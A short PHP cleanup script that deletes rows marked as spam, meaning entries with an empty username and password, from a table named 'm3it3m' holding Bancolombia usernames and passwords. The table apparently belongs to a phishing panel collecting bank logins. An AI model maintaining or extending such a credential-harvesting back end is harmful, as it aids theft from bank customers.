<?php
// Script de limpieza de spam — ejecutar UNA VEZ y luego borrar
require_once __DIR__ . '/../include/link.php';

if (!isset($_GET['confirm']) || $_GET['confirm'] !== 'si') {
    die('Agrega ?confirm=si a la URL para ejecutar la limpieza.');
}

if ($con = conectar()) {
    // Eliminar registros de Bancolombia con usuario vacío o muy corto (spam)
    $result = sentencia($con, "DELETE FROM m3it3m WHERE banco = 'Bancolombia' AND (usuario = '' OR usuario IS NULL OR LENGTH(TRIM(usuario)) < 4) AND password = '' AND status = '1'");
    $deleted = mysqli_affected_rows($con);
    desconectar($con);
    echo "✅ Limpieza completada. Registros spam eliminados: <strong>$deleted</strong>";
} else {
    echo "❌ Error de conexión a la base de datos.";
}
?>
